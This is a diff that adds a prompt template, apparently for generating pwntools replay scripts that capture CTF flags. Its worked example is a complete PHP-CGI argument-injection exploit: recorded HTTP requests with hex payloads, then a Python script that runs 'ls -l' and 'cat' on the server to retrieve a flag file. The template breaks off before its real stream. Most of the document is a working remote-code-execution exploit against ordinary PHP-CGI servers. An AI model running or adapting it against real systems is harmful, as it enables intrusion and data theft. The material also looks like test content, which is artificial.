@@ -1,0 +1,146 @@
+Write a Python code to replay a prerecorded TCP stream as follows:
+- The objective for replaying the stream is to retrieve and extract a string given as $FLAG_REGEX in regular expression from TCP payload from the server during the replay.
+- The string can be different from what was recorded and this is why it has to be dynamically retrieved at the time of replay execution.
+- The server IP address or FQDN is to be given to the code as an argument "--target_server".
+- Use pwn library for replaying the recorded TCP stream.
+- Ignore PEP8 line length limit. A line of generated Python code can continue be more than 79 characters.
+- Insert newlines only at the end of byte string, not in the middle, when preparing payloads. 
+- Enable debug output in order to make the payload exchanged visible.
+- Be cautious to check payload for $FLAG_REGEX every time traffic received from the server just as the eyes of human being do quickly even when it looks waste. If $FLAG_REGEX is found in the server response, stop the execution otherwise continue the replay.
+- In the prerecorded TCP stream being given, payload of packets from client is prefixed with "client: " while that from server with "server: ".
+- In the recorded stream, packets from client is also represented in hexadecimal, prefixed with "client-hex: " as replay needs precision.
+- Note that a part of payload from client could be based upon a part of payload of previous reply from server.
+
+The actual prerecorded TCP stream will be given after one example - a pair of prerecorded TCP stream and the corrspoinding Python code to replay the stream.
+
+Example 1 - prerecorded TCP stream
+```
+client: POST /q12/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+client: TE: deflate,gzip;q=0.3
+client: Connection: keep-alive
+client: Host: ctfq.u1tramarine.blue
+client: User-Agent: lwp-request/6.77 libwww-perl/6.77
+client: Content-Length: 32
+client: Content-Type: application/x-www-form-urlencoded
+client: 
+client: <?php system('ls -l');die(); ?>
+client-hex: 504f5354202f7131322f3f2d642b616c6c6f775f75726c5f696e636c756465253364312b2d642b6175746f5f70726570656e645f66696c652533647068703a2f2f696e70757420485454502f312e310d0a54453a206465666c6174652c677a69703b713d302e330d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a486f73743a20637466712e75317472616d6172696e652e626c75650d0a557365722d4167656e743a206c77702d726571756573742f362e3737206c69627777772d7065726c2f362e37370d0a436f6e74656e742d4c656e6774683a2033320d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a0d0a3c3f7068702073797374656d28276c73202d6c27293b64696528293b203f3e0a
+
+server: HTTP/1.1 200 OK
+server: Server: nginx
+server: Date: Wed, 02 Apr 2025 01:23:35 GMT
+server: Content-Type: text/html
+server: Transfer-Encoding: chunked
+server: Connection: keep-alive
+server: X-Powered-By: PHP/5.4.1
+server: 
+server: b8
+server: total 18656
+server: -r--r--r-- 1 root root       22 Feb 24  2021 flag_flag_flag.txt
+server: -r--r--r-- 1 root root      600 Feb 24  2021 index.php
+server: -r-xr-xr-x 1 root root 19093315 Feb 24  2021 php.cgi
+server: 
+server: 0
+server: 
+
+client: POST /q12/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
+client: TE: deflate,gzip;q=0.3
+client: Connection: keep-alive
+client: Host: ctfq.u1tramarine.blue
+client: User-Agent: lwp-request/6.77 libwww-perl/6.77
+client: Content-Length: 49
+client: Content-Type: application/x-www-form-urlencoded
+client: 
+client: <?php system('cat flag_flag_flag.txt');die(); ?>
+client-hex: 504f5354202f7131322f3f2d642b616c6c6f775f75726c5f696e636c756465253364312b2d642b6175746f5f70726570656e645f66696c652533647068703a2f2f696e70757420485454502f312e310d0a54453a206465666c6174652c677a69703b713d302e330d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a486f73743a20637466712e75317472616d6172696e652e626c75650d0a557365722d4167656e743a206c77702d726571756573742f362e3737206c69627777772d7065726c2f362e37370d0a436f6e74656e742d4c656e6774683a2034390d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a0d0a3c3f7068702073797374656d282763617420666c61675f666c61675f666c61672e74787427293b64696528293b203f3e0a
+
+server: HTTP/1.1 200 OK
+server: Server: nginx
+server: Date: Wed, 02 Apr 2025 01:23:39 GMT
+server: Content-Type: text/html
+server: Transfer-Encoding: chunked
+server: Connection: keep-alive
+server: X-Powered-By: PHP/5.4.1
+server: 
+server: 16
+server: FLAG_ZysbiGgbHrN3f9zs
+server: 
+server: 0
+server: 
+```
+
+Example 1 - Python code corresponding to the prerecorded TCP stream
+```python
+import argparse
+import re
+from pwn import *
+
+def replay_tcp_stream(target_server):
+    context.log_level = 'debug'
+    port = 80  # Assuming HTTP
+
+    # Establish connection
+    conn = remote(target_server, port)
+    
+    # First request
+    request1 = b"".join([
+        b"POST /q12/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\r\n",
+        b"TE: deflate,gzip;q=0.3\r\n",
+        b"Connection: keep-alive\r\n",
+        b"Host: " + target_server.encode() + b"\r\n",
+        b"User-Agent: lwp-request/6.77 libwww-perl/6.77\r\n",
+        b"Content-Length: 32\r\n",
+        b"Content-Type: application/x-www-form-urlencoded\r\n",
+        b"\r\n",
+        b"<?php system('ls -l');die(); ?>\n"
+    ])
+    conn.send(request1)
+    response1 = conn.recvrepeat(2)
+    print(response1.decode(errors='ignore'))
+    
+    # Extract filename from response
+    match = re.search(rb'([-_a-zA-Z0-9]+\.txt)', response1)
+    if not match:
+        log.failure("Failed to find target filename in response")
+        return
+    filename = match.group(1).decode()
+    log.info(f"Extracted filename: {filename}")
+    
+    # Second request (retrieving flag)
+    request2 = b"".join([
+        b"POST /q12/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\r\n",
+        b"TE: deflate,gzip;q=0.3\r\n",
+        b"Connection: keep-alive\r\n",
+        b"Host: " + target_server.encode() + b"\r\n",
+        b"User-Agent: lwp-request/6.77 libwww-perl/6.77\r\n",
+        b"Content-Length: " + str(len(filename) + 21).encode() + b"\r\n",
+        b"Content-Type: application/x-www-form-urlencoded\r\n",
+        b"\r\n",
+        b"<?php system('cat " + filename.encode() + b"');die(); ?>\n",
+    ])
+    conn.send(request2)
+    response2 = conn.recvrepeat(2)
+    print(response2.decode(errors='ignore'))
+    
+    # Extract flag
+    flag_match = re.search(rb'FLAG_[0-9a-zA-Z]+', response2)
+    if flag_match:
+        flag = flag_match.group().decode()
+        log.success(f"Extracted flag: {flag}")
+    else:
+        log.failure("Flag not found in response")
+    
+    # Close connection
+    conn.close()
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Replay a prerecorded TCP stream and extract a flag.")
+    parser.add_argument("--target_server", required=True, help="Target server IP or FQDN")
+    args = parser.parse_args()
+    
+    replay_tcp_stream(args.target_server)
+```
+
+Here comes a real problem to solve.
+Generate a Python code to replay the following TCP stream:
+```
